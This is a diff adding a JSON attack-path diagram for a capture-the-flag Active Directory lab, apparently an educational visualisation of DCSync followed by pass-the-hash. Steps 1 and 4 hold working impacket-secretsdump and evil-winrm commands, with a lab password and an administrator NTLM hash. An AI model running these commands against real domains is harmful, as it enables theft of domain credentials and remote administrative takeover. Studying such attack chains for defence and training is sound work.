@@ -1,0 +1,149 @@
+{
+  "title": "DCSync to Pass-The-Hash",
+  "version": "3.0",
+  "entities": [
+    {
+      "id": "attacker_machine",
+      "label": "Attacker Environment",
+      "type": "container",
+      "icon": "IconKali",
+      "members": [
+        "secretsdump_tool",
+        "psexec_tool",
+        "ntlm_hashes"
+      ],
+      "position": {
+        "x": 512.05,
+        "y": 133.95
+      }
+    },
+    {
+      "id": "secretsdump_tool",
+      "label": "secretsdump.py",
+      "type": "node",
+      "icon": "IconCode",
+      "position": {
+        "x": 607.6,
+        "y": 69.9
+      }
+    },
+    {
+      "id": "ntlm_hashes",
+      "label": "NTDS.DIT NTLM Hashes",
+      "type": "node",
+      "icon": "IconKey",
+      "position": {
+        "x": 416.5,
+        "y": 198
+      }
+    },
+    {
+      "id": "psexec_tool",
+      "label": "Evil-WinRM",
+      "type": "node",
+      "icon": "IconTerminal",
+      "position": {
+        "x": 607.6,
+        "y": 198
+      }
+    },
+    {
+      "id": "corporate_network",
+      "label": "Corporate Network",
+      "type": "container",
+      "icon": "IconNetwork",
+      "members": [
+        "domain_controller",
+        "target_machine"
+      ],
+      "position": {
+        "x": 78.39999999999998,
+        "y": 262.05
+      }
+    },
+    {
+      "id": "domain_controller",
+      "label": "Domain Controller",
+      "type": "node",
+      "icon": "IconServer",
+      "position": {
+        "x": 78.39999999999998,
+        "y": 198
+      }
+    },
+    {
+      "id": "target_machine",
+      "label": "Target Host",
+      "type": "node",
+      "icon": "IconWorkstation",
+      "position": {
+        "x": 78.39999999999998,
+        "y": 326.1
+      }
+    }
+  ],
+  "steps": [
+    {
+      "id": 1,
+      "name": "Launch secretsdump DCSync",
+      "type": "edge",
+      "from": "attacker_machine",
+      "to": "secretsdump_tool",
+      "description": "The attacker starts secretsdump to perform a DCSync-style credential pull from the Domain Controller.",
+      "cli": "impacket-secretsdump spookysec.local/backup:backup2517860@attacktivedirectory"
+    },
+    {
+      "id": 2,
+      "name": "Reach Domain Replication Path",
+      "type": "edge",
+      "from": "secretsdump_tool",
+      "to": "corporate_network",
+      "description": "The DCSync client reaches the domain replication path exposed by the Domain Controller."
+    },
+    {
+      "id": 3,
+      "name": "Receive Domain NTLM Material",
+      "type": "edge",
+      "from": "domain_controller",
+      "to": "ntlm_hashes",
+      "description": "The Domain Controller returns NTLM hash material through the replication workflow.",
+      "mitre": {
+        "id": "T1003.006",
+        "tactic": "Credential Access",
+        "technique": "OS Credential Dumping: DCSync"
+      }
+    },
+    {
+      "id": 4,
+      "name": "Load Chosen Hash into Evil-WinRM",
+      "type": "edge",
+      "from": "ntlm_hashes",
+      "to": "psexec_tool",
+      "description": "A useful NTLM hash is selected and prepared for a remote WinRM login.",
+      "cli": "evil-winrm -i attacktivedirectory -u administrator -H 0e0363213e37b94221497260b0bcb4fc"
+    },
+    {
+      "id": 5,
+      "name": "Reach Remote WinRM Service",
+      "type": "edge",
+      "from": "psexec_tool",
+      "to": "corporate_network",
+      "description": "The attacker reaches the target host's WinRM service using the selected NTLM material."
+    },
+    {
+      "id": 6,
+      "name": "Establish Remote Administrative Shell",
+      "type": "edge",
+      "from": "corporate_network",
+      "to": "target_machine",
+      "description": "The target accepts the reused hash and returns a remote administrative shell.",
+      "mitre": {
+        "id": "T1550.002",
+        "tactic": "Lateral Movement",
+        "technique": "Use Alternate Authentication Material: Pass the Hash"
+      }
+    }
+  ],
+  "attackMatrixOpen": false,
+  "sizeControlsOpen": false
+}
